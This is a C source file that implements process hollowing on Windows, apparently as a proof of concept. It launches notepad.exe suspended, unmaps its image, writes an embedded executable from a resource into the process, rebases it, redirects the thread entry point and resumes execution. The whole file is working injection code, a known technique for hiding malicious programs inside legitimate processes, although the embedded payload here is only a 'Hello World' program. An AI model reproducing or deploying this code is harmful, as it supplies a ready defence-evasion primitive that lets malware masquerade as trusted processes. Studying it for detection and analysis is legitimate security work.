#include <Windows.h>
#include <stdio.h>

#include "PEB.h"
#include "Ntapi.h"
#include "Hollower.h"
#include "resource.h"

//
// Hollower logic
//
INT main() {
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInformation;
	PLOADED_IMAGE			pImage = NULL;
	PLOADED_IMAGE			pSourceImage = NULL;
	PIMAGE_NT_HEADERS32		pSourceHeaders;
	LPCONTEXT				pContext = NULL;
	_PPEB					pPEB = NULL;
	NTSTATUS				ntStatus;
	HANDLE					hHostProcess;
	HRSRC					hrsrcHelloWorld;
	INT						iRet = ERROR_SUCCESS;
	DWORD					dwExeSize;
	DWORD					dwDelta;
	HGLOBAL					hgExe;
	PBYTE 					pBuffer = NULL;
	PVOID					pRemoteImage;

	// Function pointers
	NTUNMAPVIEWOFSECTION	pNtUnmapViewOfSection;
	RTLNTSTATUSTODOSERROR	pRtlNtStatusToDosError;

	//
	// Load required functions from ntdll
	//
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll) {
		pNtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
		pRtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(hNtdll, "RtlNtStatusToDosError");
		FreeLibrary(hNtdll);
	}
	else {
		printf("[-] Unable resolve functions\r\n");
		return ERROR_API_UNAVAILABLE;
	}
	
	//
	// Create host process
	//
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&processInformation, sizeof processInformation);

	if (CreateProcessA(NULL,
		"\"notepad.exe\"",
		NULL,
		NULL,
		0,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&startupInfo,
		&processInformation) != TRUE) 
	{
		printf("[-] Unable to create the host process\r\n");
		iRet = ERROR_CREATE_FAILED;
		goto lblCleanup;
	}

	hHostProcess = processInformation.hProcess;
	pPEB = ReadRemotePEB(hHostProcess);
	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);

	//
	// Unmap section in host process
	//
	printf("[*] Unmapping section\r\n");
	ntStatus = pNtUnmapViewOfSection(hHostProcess, pPEB->lpImageBaseAddress);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Error unmapping section\r\n");
		iRet = pRtlNtStatusToDosError(ntStatus);
		goto lblCleanup;
	}

	//
	// Load Hello World EXE from resource
	//
	hrsrcHelloWorld = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_HELLOWORLD_EXE1), L"HELLOWORLD_EXE");
	if (!hrsrcHelloWorld) {
		printf("[-] Unable to load exe from resource\r\n");
		iRet = ERROR_RESOURCE_NOT_FOUND;
		goto lblCleanup;
	}

	dwExeSize = SizeofResource(NULL, hrsrcHelloWorld);
	hgExe = LoadResource(NULL, hrsrcHelloWorld);

	pBuffer = VirtualAlloc(0, dwExeSize, MEM_COMMIT, PAGE_READWRITE);
	memcpy(pBuffer, hgExe, dwExeSize);
	
	pSourceImage = GetLoadedImage((DWORD)pBuffer);
	pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
	
	printf("[*] Allocating memory\r\n");
	pRemoteImage = VirtualAllocEx(hHostProcess,
		pPEB->lpImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pRemoteImage) {
		printf("[-] VirtualAllocEx call failed\r\n");
		iRet = GetLastError();
		goto lblCleanup;
	}

	dwDelta = (DWORD)pPEB->lpImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
	
	printf("[*] Source image base: 0x%p\r\n", pSourceHeaders->OptionalHeader.ImageBase);
	printf("[*] Destination image base: 0x%p\r\n", pPEB->lpImageBaseAddress);
	printf("[*] Relocation delta: 0x%p\r\n", dwDelta);

	if (!WriteProcessMemory(hHostProcess,
		pPEB->lpImageBaseAddress,
		pBuffer,
		pSourceHeaders->OptionalHeader.SizeOfHeaders,
		0)) 
	{
		printf("[-] Error writing process memory\r\n");
		iRet = GetLastError();
		goto lblCleanup;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->lpImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		printf("[*] Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory(hHostProcess,
			pSectionDestination,
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0))
		{
			printf("[-] Error writing process memory\r\n");
			iRet = GetLastError();
			goto lblCleanup;
		}
	}

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++) {
			PCHAR pSectionName = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("[*] Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size) {
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++) {
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory(hHostProcess,
						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0);

					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory(hHostProcess,
						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0);

					if (!bSuccess)
						printf("[-] Error writing memory\r\n");
				}
			}

			break;
		}

	DWORD dwEntrypoint = (DWORD)pPEB->lpImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

	pContext = VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	pContext->ContextFlags = CONTEXT_INTEGER;

	printf("[*] Getting thread context\r\n");

	if (!GetThreadContext(processInformation.hThread, pContext)) {
		printf("[-] Error getting context\r\n");
		goto lblCleanup;
	}

	pContext->Eax = dwEntrypoint;

	printf("[*] Setting thread context\r\n");

	if (!SetThreadContext(processInformation.hThread, pContext)) {
		printf("[-] Error setting context\r\n");
		goto lblCleanup;
	}

	printf("[*] Resuming thread\r\n");

	if (!ResumeThread(processInformation.hThread)) {
		printf("[-] Error resuming thread\r\n");
		goto lblCleanup;
	}

	printf("[+] Process hollowing complete\r\n");
	
lblCleanup:
	if (processInformation.hProcess)
		CloseHandle(processInformation.hProcess);

	if (processInformation.hThread)
		CloseHandle(processInformation.hThread);

	if (pPEB)
		VirtualFree(pPEB, 0, MEM_RELEASE);

	if (pImage)
		VirtualFree(pImage, 0, MEM_RELEASE);

	if (pBuffer)
		VirtualFree(pBuffer, 0, MEM_RELEASE);

	if (pSourceImage)
		VirtualFree(pSourceImage, 0, MEM_RELEASE);

	if (pContext)
		VirtualFree(pContext, 0, MEM_RELEASE);

	return iRet;
}

//
// Helper functions
//
PPROCESS_BASIC_INFORMATION FindRemotePeb(CONST HANDLE hProcess) {																									// NOLINT(misc-misplaced-const)
	NTSTATUS ntStatus;
	PPROCESS_BASIC_INFORMATION pBasicInfo;
	DWORD dwReturnLength = 0;

	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess;
	
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll");
	if (hNtdll) {
		pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "NtQueryInformationProcess");
		FreeLibrary(hNtdll);
	}
	else {
		return NULL;
	}

	pBasicInfo = VirtualAlloc(NULL, sizeof(PROCESS_BASIC_INFORMATION), MEM_COMMIT, PAGE_READWRITE);
	ntStatus= pNtQueryInformationProcess(hProcess,
		0,
		pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength);

	if (NT_SUCCESS(ntStatus)) 
		return pBasicInfo;
	
	if (pBasicInfo)
		VirtualFree(pBasicInfo, 0, MEM_RELEASE);
	return NULL;
}

_PPEB ReadRemotePEB(HANDLE hProcess) {
	PPROCESS_BASIC_INFORMATION	pBasicInfo = FindRemotePeb(hProcess);
	if (!pBasicInfo)
		return NULL;

	DWORD dwPEBAddress = pBasicInfo->PebBaseAddress;

	_PPEB pPEB = VirtualAlloc(NULL, sizeof(_PEB), MEM_COMMIT, PAGE_READWRITE);
	if (!pPEB)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		(LPCVOID)dwPEBAddress,
		pPEB,
		sizeof(_PEB),
		0);
	if (!bSuccess) {
		VirtualFree(pPEB, 0, MEM_RELEASE);
		pPEB = NULL;    
	}

	if (pBasicInfo)
		VirtualFree(pBasicInfo, 0, MEM_RELEASE);

	return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {
	PLOADED_IMAGE pImage = NULL;
	
	BYTE* lpBuffer = VirtualAlloc(0, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
	if (!lpBuffer)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		lpImageBaseAddress,
		lpBuffer,
		BUFFER_SIZE,
		0);
	if (!bSuccess)
		goto lblCleanup;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
	pImage = VirtualAlloc(0, sizeof(LOADED_IMAGE), MEM_COMMIT, PAGE_READWRITE);
	if (!pImage)
		goto lblCleanup;

	pImage->FileHeader = (PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
	pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
	pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

lblCleanup:
	if (lpBuffer)
		VirtualFree(lpBuffer, 0, MEM_RELEASE);

	return pImage;
}